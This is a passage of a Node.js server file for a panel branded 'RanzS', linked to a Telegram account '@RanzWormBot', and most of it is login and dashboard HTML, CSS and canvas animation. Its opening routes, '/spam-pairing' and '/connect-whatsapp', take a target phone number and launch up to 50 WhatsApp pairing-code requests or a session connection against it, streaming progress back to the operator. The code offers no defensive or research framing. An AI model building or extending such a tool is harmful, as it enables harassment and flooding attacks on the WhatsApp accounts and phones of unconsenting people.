            console.error(`${c.red}[ERROR]${c.reset} ${err.message}`);
            sendEventToUser(username, { type: 'error', message: err.message, number: target, status: 'error' });
        });
});

app.post('/spam-pairing', async (req, res) => {
    const { target, count, username } = req.body;
    if (!target || !count || !username) return res.json({ status: 'error', message: 'Missing parameters.' });
    const pairCount = Math.min(Math.max(parseInt(count), 1), 50);
    console.log(`${c.magenta}[SPAM PAIRING]${c.reset} ${target} x${pairCount} by ${username}`);
    res.json({ status: 'processing', message: `Memulai ${pairCount} spam pairing...`, target, count: pairCount });

    spamPairingMultiple(username, target, pairCount, (user, data) => sendEventToUser(user, data))
        .then(results => {
            const sent = results.filter(r => r.status === 'sent').length;
            console.log(`${c.green}[PAIRING DONE]${c.reset} ${sent}/${pairCount} sent`);
        })
        .catch(err => sendEventToUser(username, { type: 'error', message: err.message }));
});

app.post('/connect-whatsapp', async (req, res) => {
    const { target, username } = req.body;
    if (!target || !username) return res.json({ status: 'error', message: 'Missing parameters.' });
    const sessionDir = path.join(SESSIONS_DIR, `connect_${target}_${Date.now()}`);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    console.log(`${c.cyan}[CONNECT WA]${c.reset} ${target} by ${username}`);
    res.json({ status: 'processing', message: `Connecting to ${target}...`, target });

    connectToWhatsAppUser(username, target, sessionDir, (user, data) => sendEventToUser(user, data))
        .then(() => logToFile(`WA Connected: ${target} by ${username}`))
        .catch(err => sendEventToUser(username, { type: 'error', message: err.message }));
});

app.get('/events', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).json({ error: 'Username required' });

    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE connected' })}\n\n`);

    if (!userEventCallbacks[username]) userEventCallbacks[username] = [];
    const callback = (data) => res.write(`data: ${JSON.stringify(data)}\n\n`);
    userEventCallbacks[username].push(callback);

    req.on('close', () => {
        if (userEventCallbacks[username]) {
            userEventCallbacks[username] = userEventCallbacks[username].filter(cb => cb !== callback);
            if (!userEventCallbacks[username].length) delete userEventCallbacks[username];
        }
    });
});

app.get('/check-session', (req, res) => {
    const sessionId = req.cookies.session;
    if (!sessionId) return res.json({ status: 'error' });
    const users = loadUsers();
    const user = users.users.find(u => u.id === sessionId);
    if (!user) return res.json({ status: 'error' });
    res.json({ status: 'success', username: user.username, userId: user.id });
});

// =============================================
// LOGIN PAGE - ATLANTIC BLACKHOLE THEME
// =============================================

const LOGIN_PAGE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RanzS - Atlantic Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap');

        :root {
            --neon-purple: #8b5cf6;
            --neon-pink: #ec4899;
            --neon-blue: #3b82f6;
            --neon-cyan: #06b6d4;
            --neon-white: #f8fafc;
            --dark-bg: #020008;
            --card-bg: rgba(5, 3, 20, 0.85);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--dark-bg);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
            cursor: default;
        }

        /* ========== BLACKHOLE CANVAS ========== */
        #blackhole-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0;
            pointer-events: none;
        }

        /* ========== STARFIELD ========== */
        .stars {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        .star {
            position: absolute;
            width: 2px; height: 2px;
            background: white;
            border-radius: 50%;
            animation: twinkle var(--duration) ease-in-out infinite;
            animation-delay: var(--delay);
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(2); }
        }

        /* ========== MAIN CONTAINER ========== */
        .main-container {
            position: relative;
            z-index: 10;
            width: 460px;
            max-width: 95%;
            perspective: 1000px;
        }

        /* ========== CARD WITH RGB BORDER ========== */
        .login-card-wrapper {
            position: relative;
            padding: 3px;
            border-radius: 24px;
            background: transparent;
            animation: rgbBorderGlow 4s linear infinite;
        }

        .login-card-wrapper::before {
            content: '';
            position: absolute;
            inset: -2px;
            border-radius: 26px;
            padding: 2px;
            background: conic-gradient(
                from var(--angle),
                #ffffff 0%, #8b5cf6 15%, #ffffff 30%, #ec4899 45%,
                #ffffff 60%, #3b82f6 75%, #ffffff 90%, #8b5cf6 100%
            );
            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            animation: rotateBorder 6s linear infinite, rgbPulse 3s ease-in-out infinite;
            z-index: -1;
        }

        @property --angle {
            syntax: '<angle>';
            initial-value: 0deg;
            inherits: false;
        }

        @keyframes rotateBorder {
            0% { --angle: 0deg; }
            100% { --angle: 360deg; }
        }

        @keyframes rgbPulse {
            0%, 100% { filter: brightness(1) blur(0px); }
            50% { filter: brightness(1.3) blur(1px); }
        }

        .login-card-wrapper::after {
            content: '';
            position: absolute;
            inset: 4px;
            border-radius: 22px;
            background: var(--card-bg);
            z-index: -1;
        }

        /* ========== CARD INNER ========== */
        .login-card {
            position: relative;
            z-index: 1;
            background: transparent;
            border-radius: 22px;
            padding: 48px 36px 36px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        /* ========== NEBULA GLOW INSIDE CARD ========== */
        .card-glow {
            position: absolute;
            top: 20%; left: 10%;
            width: 80%; height: 60%;
            background: radial-gradient(ellipse at center, 
                rgba(139, 92, 246, 0.15) 0%, 
                rgba(236, 72, 153, 0.08) 30%,
                rgba(59, 130, 246, 0.05) 60%,
                transparent 100%
            );
            border-radius: 50%;
            filter: blur(40px);
            animation: glowFloat 8s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        @keyframes glowFloat {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(5%, -5%) scale(1.1); }
            50% { transform: translate(-3%, 3%) scale(0.95); }
            75% { transform: translate(-5%, -3%) scale(1.05); }
        }

        .card-content {
            position: relative;
            z-index: 2;
        }

        /* ========== LOGO SECTION ========== */
        .logo-section {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo-ring {
            width: 80px; height: 80px;
            margin: 0 auto 20px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-ring::before {
            content: '';
            position: absolute;
            inset: -8px;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: var(--neon-purple);
            border-right-color: var(--neon-pink);
            border-bottom-color: var(--neon-blue);
            border-left-color: var(--neon-cyan);
            animation: logoSpin 3s linear infinite;
        }

        .logo-ring::after {
            content: '';
            position: absolute;
            inset: -16px;
            border-radius: 50%;
            border: 1px solid transparent;
            border-top-color: rgba(139, 92, 246, 0.4);
            border-bottom-color: rgba(236, 72, 153, 0.4);
            animation: logoSpin 6s linear infinite reverse;
        }

        @keyframes logoSpin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .logo-inner {
            width: 56px; height: 56px;
            background: linear-gradient(135deg, #8b5cf6, #6d28d9, #4c1d95);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 40px rgba(139, 92, 246, 0.5), 0 0 80px rgba(139, 92, 246, 0.2);
            position: relative;
            z-index: 1;
        }

        .logo-inner svg {
            width: 28px; height: 28px;
            fill: white;
            filter: drop-shadow(0 0 8px rgba(255,255,255,0.5));
        }

        .system-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 32px;
            font-weight: 900;
            letter-spacing: 4px;
            background: linear-gradient(135deg, #ffffff 0%, #8b5cf6 30%, #ec4899 60%, #ffffff 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: none;
            animation: titleShine 3s ease-in-out infinite;
            margin-bottom: 4px;
        }

        @keyframes titleShine {
            0%, 100% { filter: brightness(1); }
            50% { filter: brightness(1.3); }
        }

        .system-subtitle {
            font-family: 'Orbitron', sans-serif;
            font-size: 10px;
            letter-spacing: 6px;
            color: rgba(255, 255, 255, 0.4);
            text-transform: uppercase;
        }

        .atlantic-badge {
            display: inline-block;
            margin-top: 12px;
            padding: 6px 16px;
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 20px;
            font-size: 10px;
            letter-spacing: 3px;
            color: rgba(255, 255, 255, 0.5);
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            animation: badgeGlow 2s ease-in-out infinite;
        }

        @keyframes badgeGlow {
            0%, 100% { border-color: rgba(139, 92, 246, 0.3); box-shadow: 0 0 5px rgba(139, 92, 246, 0.1); }
            50% { border-color: rgba(139, 92, 246, 0.6); box-shadow: 0 0 15px rgba(139, 92, 246, 0.3); }
        }

        /* ========== FORM SECTION ========== */
        .form-section {
            position: relative;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 2px;
            color: rgba(255, 255, 255, 0.5);
            margin-bottom: 8px;
            text-transform: uppercase;
            font-family: 'Orbitron', sans-serif;
        }

        .input-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.3);
            z-index: 2;
            transition: color 0.3s;
        }

        .input-field {
            width: 100%;
            padding: 15px 16px 15px 48px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 14px;
            color: white;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            outline: none;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            z-index: 1;
        }

        .input-field:focus {
            border-color: var(--neon-purple);
            background: rgba(139, 92, 246, 0.05);
            box-shadow: 0 0 25px rgba(139, 92, 246, 0.15), 0 0 0 4px rgba(139, 92, 246, 0.05);
        }

        .input-field:focus ~ .input-icon,
        .input-field:focus + .input-icon {
            color: var(--neon-purple);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.15);
            font-weight: 300;
        }

        .input-glow {
            position: absolute;
            bottom: -1px;
            left: 20%;
            width: 60%;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-purple), transparent);
            opacity: 0;
            transition: opacity 0.4s;
            z-index: 0;
        }

        .input-field:focus ~ .input-glow {
            opacity: 1;
        }

        /* ========== BUTTON ========== */
        .btn-wrapper {
            position: relative;
            margin-top: 28px;
        }

        .btn-glow-bg {
            position: absolute;
            inset: -4px;
            border-radius: 16px;
            background: conic-gradient(
                from 0deg,
                #ffffff, #8b5cf6, #ffffff, #ec4899, #ffffff, #3b82f6, #ffffff
            );
            opacity: 0;
            filter: blur(10px);
            transition: opacity 0.4s;
        }

        .btn-wrapper:hover .btn-glow-bg {
            opacity: 0.6;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #8b5cf6 0%, #6d28d9 50%, #4c1d95 100%);
            border: 1px solid rgba(139, 92, 246, 0.4);
            border-radius: 14px;
            color: white;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 3px;
            font-family: 'Orbitron', sans-serif;
            cursor: pointer;
            position: relative;
            z-index: 1;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            overflow: hidden;
            text-transform: uppercase;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(139, 92, 246, 0.5), 0 0 60px rgba(139, 92, 246, 0.2);
        }

        .btn-submit:active {
            transform: translateY(0);
            transition: transform 0.1s;
        }

        .btn-submit::after {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }

        .btn-submit:hover::after {
            left: 100%;
        }

        .btn-submit:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* ========== REGISTER LINK ========== */
        .register-section {
            text-align: center;
            margin-top: 28px;
            padding-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        .register-text {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
            margin-bottom: 8px;
        }

        .register-link {
            color: var(--neon-purple);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
            letter-spacing: 1px;
        }

        .register-link:hover {
            color: var(--neon-pink);
            text-shadow: 0 0 10px rgba(236, 72, 153, 0.5);
        }

        .telegram-chip {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(0, 136, 204, 0.15);
            border: 1px solid rgba(0, 136, 204, 0.3);
            border-radius: 20px;
            padding: 6px 14px;
            font-size: 11px;
            color: #2ea6d6;
            margin-top: 10px;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 1px;
        }

        /* ========== ERROR MESSAGE ========== */
        .error-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            padding: 12px 16px;
            color: #ef4444;
            font-size: 13px;
            text-align: center;
            margin-top: 16px;
            display: none;
            font-family: 'JetBrains Mono', monospace;
            letter-spacing: 1px;
        }

        .error-message.show { display: block; animation: shake 0.5s ease; }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        /* ========== LOADING OVERLAY ========== */
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 1000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loading-overlay.show { display: flex; }

        .loading-box {
            background: rgba(10, 8, 30, 0.95);
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            width: 380px;
            max-width: 90%;
            box-shadow: 0 0 40px rgba(139, 92, 246, 0.2);
        }

        .loading-spinner {
            width: 60px; height: 60px;
            margin: 0 auto 24px;
            position: relative;
        }

        .loading-spinner::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: var(--neon-purple);
            border-right-color: var(--neon-pink);
            animation: spin 0.8s linear infinite;
        }

        .loading-spinner::after {
            content: '';
            position: absolute;
            inset: 8px;
            border-radius: 50%;
            border: 2px solid transparent;
            border-bottom-color: var(--neon-blue);
            border-left-color: var(--neon-cyan);
            animation: spin 1.2s linear infinite reverse;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            color: white;
            letter-spacing: 3px;
            margin-bottom: 20px;
        }

        .loading-steps {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .loading-step {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 14px;
            background: rgba(255,255,255,0.02);
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.04);
            transition: all 0.4s;
        }

        .loading-step.complete {
            border-color: rgba(34, 197, 94, 0.3);
            background: rgba(34, 197, 94, 0.05);
        }

        .step-dot {
            width: 10px; height: 10px;
            border-radius: 50%;
            background: rgba(139, 92, 246, 0.3);
            transition: all 0.4s;
        }

        .loading-step.complete .step-dot {
            background: #22c55e;
            box-shadow: 0 0 10px rgba(34, 197, 94, 0.5);
        }

        .step-label {
            font-size: 12px;
            color: rgba(255,255,255,0.5);
            font-family: 'JetBrains Mono', monospace;
            transition: all 0.4s;
        }

        .loading-step.complete .step-label {
            color: #22c55e;
        }

        /* ========== FOOTER ========== */
        .footer-text {
            text-align: center;
            margin-top: 24px;
            font-size: 10px;
            letter-spacing: 3px;
            color: rgba(255, 255, 255, 0.15);
            font-family: 'Orbitron', sans-serif;
            z-index: 10;
            position: relative;
        }

        /* ========== RESPONSIVE ========== */
        @media (max-width: 500px) {
            .login-card { padding: 36px 24px 28px; }
            .system-title { font-size: 24px; letter-spacing: 2px; }
        }
    </style>
</head>
<body>

    <!-- Blackhole Canvas -->
    <canvas id="blackhole-canvas"></canvas>

    <!-- Stars -->
    <div class="stars" id="stars"></div>

    <!-- Main Container -->
    <div class="main-container">
        <div class="login-card-wrapper">
            <div class="login-card">
                <div class="card-glow"></div>
                <div class="card-content">
                    <!-- Logo -->
                    <div class="logo-section">
                        <div class="logo-ring">
                            <div class="logo-inner">
                                <svg viewBox="0 0 24 24">
                                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                                </svg>
                            </div>
                        </div>
                        <div class="system-title">RanzS</div>
                        <div class="system-subtitle">Atlantic Protocol</div>
                        <div class="atlantic-badge">✦ Blackhole Access ✦</div>
                    </div>

                    <!-- Form -->
                    <form id="login-form" class="form-section">
                        <div class="input-group">
                            <label class="input-label">Username</label>
                            <div class="input-wrapper">
                                <svg class="input-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                                </svg>
                                <input type="text" class="input-field" id="username" placeholder="Enter your username" required autocomplete="off">
                                <div class="input-glow"></div>
                            </div>
                        </div>

                        <div class="input-group">
                            <label class="input-label">Password</label>
                            <div class="input-wrapper">
                                <svg class="input-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                                </svg>
                                <input type="password" class="input-field" id="password" placeholder="Enter your password" required>
                                <div class="input-glow"></div>
                            </div>
                        </div>

                        <div class="error-message" id="login-error"></div>

                        <div class="btn-wrapper">
                            <div class="btn-glow-bg"></div>
                            <button type="submit" class="btn-submit" id="submit-btn">
                                Initialize
                            </button>
                        </div>
                    </form>

                    <!-- Register -->
                    <div class="register-section">
                        <p class="register-text">No access yet?</p>
                        <a href="https://t.me/RanzWormBot" target="_blank" class="register-link">Request via Telegram</a>
                        <div class="telegram-chip">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.05-.2-.07-.05-.17-.03-.24-.02-.1.02-1.73 1.1-4.88 3.22-.46.32-.88.47-1.25.46-.41-.01-1.2-.23-1.79-.42-.72-.24-1.29-.36-1.24-.76.03-.21.31-.42.85-.64 3.34-1.45 5.56-2.41 6.67-2.87 3.17-1.32 3.83-1.55 4.26-1.56.09 0 .3.02.43.13.11.09.14.22.15.26.01.04.02.15.01.24z"/></svg>
                            @RanzWormBot
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-text">✦ Engineered by Ranzkecebet ✦</div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-box">
            <div class="loading-spinner"></div>
            <div class="loading-title">AUTHENTICATING</div>
            <div class="loading-steps">
                <div class="loading-step" id="ls1">
                    <div class="step-dot"></div>
                    <span class="step-label">Verifying credentials...</span>
                </div>
                <div class="loading-step" id="ls2">
                    <div class="step-dot"></div>
                    <span class="step-label">Establishing secure tunnel...</span>
                </div>
                <div class="loading-step" id="ls3">
                    <div class="step-dot"></div>
                    <span class="step-label">Decrypting access key...</span>
                </div>
                <div class="loading-step" id="ls4">
                    <div class="step-dot"></div>
                    <span class="step-label">Initializing dashboard...</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ========== BLACKHOLE CANVAS ==========
        const canvas = document.getElementById('blackhole-canvas');
        const ctx = canvas.getContext('2d');
        let width, height;
        let particles = [];
        let time = 0;

        function resize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        }
        resize();
        window.addEventListener('resize', resize);

        // Blackhole particle system
        class SpaceParticle {
            constructor() {
                this.reset();
            }
            reset() {
                const angle = Math.random() * Math.PI * 2;
                const radius = 50 + Math.random() * 200;
                this.x = width / 2 + Math.cos(angle) * radius;
                this.y = height / 2 + Math.sin(angle) * radius;
                this.vx = (width / 2 - this.x) * 0.001;
                this.vy = (height / 2 - this.y) * 0.001;
                this.size = Math.random() * 1.5 + 0.5;
                this.opacity = Math.random() * 0.6 + 0.2;
                this.color = ['#8b5cf6', '#ec4899', '#3b82f6', '#06b6d4', '#ffffff'][Math.floor(Math.random() * 5)];
                this.life = 1;
                this.decay = 0.002 + Math.random() * 0.003;
            }
            update() {
                const dx = width / 2 - this.x;
                const dy = height / 2 - this.y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                const force = 0.8 / (dist * 0.05 + 1);
                this.vx += dx * force * 0.01;
                this.vy += dy * force * 0.01;
                this.vx *= 0.98;
                this.vy *= 0.98;
                this.x += this.vx;
                this.y += this.vy;
                this.life -= this.decay;
                if (this.life <= 0 || dist < 30) this.reset();
            }
            draw(ctx) {
                const alpha = this.opacity * this.life;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = this.color;
                ctx.globalAlpha = alpha;
                ctx.fill();
                ctx.globalAlpha = 1;
            }
        }

        for (let i = 0; i < 300; i++) {
            particles.push(new SpaceParticle());
        }

        function drawBlackhole() {
            const cx = width / 2;
            const cy = height / 2;

            // Outer glow rings
            for (let i = 3; i >= 0; i--) {
                const radius = 30 + i * 15 + Math.sin(time * 0.5 + i) * 5;
                const alpha = 0.03 + i * 0.015;
                const gradient = ctx.createRadialGradient(cx, cy, radius * 0.5, cx, cy, radius);
                gradient.addColorStop(0, 'rgba(139, 92, 246, 0)');
                gradient.addColorStop(0.5, `rgba(139, 92, 246, ${alpha * 0.5})`);
                gradient.addColorStop(1, 'rgba(139, 92, 246, 0)');
                ctx.beginPath();
                ctx.arc(cx, cy, radius, 0, Math.PI * 2);
                ctx.fillStyle = gradient;
                ctx.fill();
            }

            // Core
            const coreGradient = ctx.createRadialGradient(cx, cy, 0, cx, cy, 40);
            coreGradient.addColorStop(0, 'rgba(5, 3, 20, 1)');
            coreGradient.addColorStop(0.6, 'rgba(10, 5, 40, 0.8)');
            coreGradient.addColorStop(1, 'rgba(20, 10, 60, 0)');
            ctx.beginPath();
            ctx.arc(cx, cy, 40, 0, Math.PI * 2);
            ctx.fillStyle = coreGradient;
            ctx.fill();

            // Accretion disk
            const diskGradient = ctx.createRadialGradient(cx, cy, 35, cx, cy, 80);
            diskGradient.addColorStop(0, 'rgba(139, 92, 246, 0.1)');
            diskGradient.addColorStop(0.5, 'rgba(236, 72, 153, 0.05)');
            diskGradient.addColorStop(1, 'rgba(139, 92, 246, 0)');
            ctx.save();
            ctx.translate(cx, cy);
            ctx.rotate(time * 0.3);
            ctx.beginPath();
            ctx.ellipse(0, 0, 60, 20, 0, 0, Math.PI * 2);
            ctx.fillStyle = diskGradient;
            ctx.fill();
            ctx.restore();
        }

        function animate() {
            ctx.fillStyle = 'rgba(2, 0, 8, 0.15)';
            ctx.fillRect(0, 0, width, height);
            drawBlackhole();
            particles.forEach(p => { p.update(); p.draw(ctx); });
            time++;
            requestAnimationFrame(animate);
        }
        animate();

        // ========== STARS ==========
        const starsContainer = document.getElementById('stars');
        for (let i = 0; i < 200; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.setProperty('--duration', (2 + Math.random() * 4) + 's');
            star.style.setProperty('--delay', Math.random() * 5 + 's');
            star.style.width = (1 + Math.random() * 2) + 'px';
            star.style.height = star.style.width;
            starsContainer.appendChild(star);
        }

        // ========== LOGIN ==========
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorEl = document.getElementById('login-error');
            const submitBtn = document.getElementById('submit-btn');
            const overlay = document.getElementById('loading-overlay');

            if (!username || !password) {
                errorEl.textContent = '✦ All fields are required';
                errorEl.classList.add('show');
                return;
            }

            errorEl.classList.remove('show');
            overlay.classList.add('show');
            submitBtn.disabled = true;

            const steps = ['ls1', 'ls2', 'ls3', 'ls4'];
            for (let i = 0; i < steps.length; i++) {
                await new Promise(r => setTimeout(r, 700 + Math.random() * 500));
                document.getElementById(steps[i]).classList.add('complete');
            }

            try {
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await res.json();

                if (data.status === 'success') {
                    await new Promise(r => setTimeout(r, 800));
                    window.location.href = '/dashboard';
                } else {
                    overlay.classList.remove('show');
                    errorEl.textContent = '✦ ' + (data.message || 'Authentication failed');
                    errorEl.classList.add('show');
                    submitBtn.disabled = false;
                    steps.forEach(s => document.getElementById(s).classList.remove('complete'));
                }
            } catch(err) {
                overlay.classList.remove('show');
                errorEl.textContent = '✦ Connection error';
                errorEl.classList.add('show');
                submitBtn.disabled = false;
                steps.forEach(s => document.getElementById(s).classList.remove('complete'));
            }
        });

        // ========== CSS PROPERTY HACK UNTUK --angle ==========
        const style = document.createElement('style');
        style.textContent = \`
            @property --angle {
                syntax: '<angle>';
                initial-value: 0deg;
                inherits: false;
            }
        \`;
        document.head.appendChild(style);
    </script>
</body>
</html>`;

// =============================================
// DASHBOARD PAGE (Sama seperti sebelumnya)
// =============================================
app.get('/dashboard', (req, res) => {
    res.send(DASHBOARD_HTML);
});

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RanzS - Dashboard</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #020008;
            min-height: 100vh;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container { width: 550px; max-width: 100%; }
        .card {
            background: rgba(10, 8, 30, 0.9);
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 24px;
            padding: 36px 28px;
            box-shadow: 0 0 50px rgba(139, 92, 246, 0.15), 0 0 0 4px rgba(139, 92, 246, 0.05);
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.08) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
        }
        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .card-content { position: relative; z-index: 1; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 28px; padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .title {
            font-family: 'Orbitron', sans-serif; font-size: 20px; font-weight: 700;
            background: linear-gradient(135deg, #fff, #8b5cf6);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .subtitle {
            font-size: 10px; color: rgba(255,255,255,0.3); font-family: 'Orbitron', sans-serif;
            letter-spacing: 3px; margin-top: 4px;
        }
        .user-badge {
            background: rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 20px; padding: 8px 16px; font-size: 12px; color: #8b5cf6;
        }
        .logout-btn {
            background: transparent; border: 1px solid rgba(239, 68, 68, 0.3);
            color: #ef4444; padding: 8px 16px; border-radius: 8px; cursor: pointer;
            font-size: 11px; transition: all 0.3s; font-family: 'JetBrains Mono', monospace;
        }
        .logout-btn:hover { background: rgba(239, 68, 68, 0.1); }
        .menu-label {
            font-size: 10px; letter-spacing: 3px; color: rgba(255,255,255,0.4);
            font-family: 'Orbitron', sans-serif; margin-bottom: 12px;
        }
        .menu-grid {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;
        }
        .menu-item {
            padding: 16px 10px; background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.06); border-radius: 14px;
            text-align: center; cursor: pointer; transition: all 0.3s;
            font-size: 11px; font-family: 'JetBrains Mono', monospace; color: rgba(255,255,255,0.6);
        }
        .menu-item:hover { border-color: rgba(139,92,246,0.3); background: rgba(139,92,246,0.05); }
        .menu-item.active {
            border-color: #8b5cf6; background: rgba(139,92,246,0.15);
            box-shadow: 0 0 20px rgba(139,92,246,0.2); color: white;
        }
        .menu-icon { font-size: 22px; margin-bottom: 6px; display: block; }
        .target-section {
            display: none; padding: 20px; background: rgba(255,255,255,0.01);
            border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; margin-top: 8px;
        }
        .target-section.show { display: block; }
        .input-group { margin-bottom: 16px; }
        .input-label {
            font-size: 10px; letter-spacing: 2px; color: rgba(255,255,255,0.4);
            font-family: 'Orbitron', sans-serif; margin-bottom: 6px; display: block;
        }
        .input-field {
            width: 100%; padding: 12px 16px; background: rgba(255,255,255,0.03);
